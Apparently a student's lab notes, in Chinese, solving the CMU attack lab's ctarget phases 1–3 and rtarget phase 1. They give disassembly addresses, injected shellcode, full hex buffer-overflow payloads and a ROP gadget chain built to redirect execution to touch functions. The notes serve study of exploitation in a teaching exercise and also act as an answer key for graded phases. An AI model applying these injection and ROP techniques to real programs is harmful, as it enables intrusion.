0000000000401eb4 <launch>:
0000000000401968 <test>:
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp   40

00000000004017c0 <touch1>:
由实验说明和反编译代码可知，
通过溢出buf，改写后续代码，让ret指令读取touch1的地址
需用hex2raw转译为二进制
cat ctarget11.txt | ./hex2raw | ./ctarget -q

ctarget phase_1
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
c0 17 40 00 00 00 00 00

-----------------------------------------------------

00000000004017ec <touch2>:

需要把cookie值存入变量传递给touch2，再跳转到touch2
采用ret指令跳回buf区，执行改写的代码
注意追踪rsp的位置变化

movq $0x59b997fa,%rdi
pushq $0x004017ec
retq

ctarget phase_2
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00

-----------------------------------------------------

00000000004018fa <touch3>:
000000000040184c <hexmatch>:

touch3读取字符串指针，函数内部传递cookie和指针到hexmatch，

getbuf的栈帧被输入值占用
hexmatch设置rsp~rsp+128的栈帧，对rsp~rsp+100的区域有随机数据写入，造成原有数据破坏
因不需考虑对其他函数栈帧的破坏，可考虑把跳转地址放置在test函数的栈帧（即getbuf栈帧外）
rsp 5561dc78 + 0x28 = 5561dca0
0x59b997fa -> 35 39 62 39 39 37 66 61 00

movq $0x5561dca8,%rdi
pushq $0x4018fa
retq
ctarget phase_3
48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00

------------------------------------------------------

rtarget phase_1

参考ctarget phase_2的操作，本想找对应的16进制模式，
但发现要找到一模一样的cookie值传给函数很成问题。
仔细翻阅实验说明，发现有pop指令，对应start_farm到mid_farm的代码区有多个58 9X c3模式，
因90代表nop指令，借用代码区多次出现的48 89 c7，配合栈帧数据和跳转，完成ROP攻击

4019cc
popq %rax
nop
ret

4019a2
movq %rax,%rdi
ret

30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

----------------------------------------------------


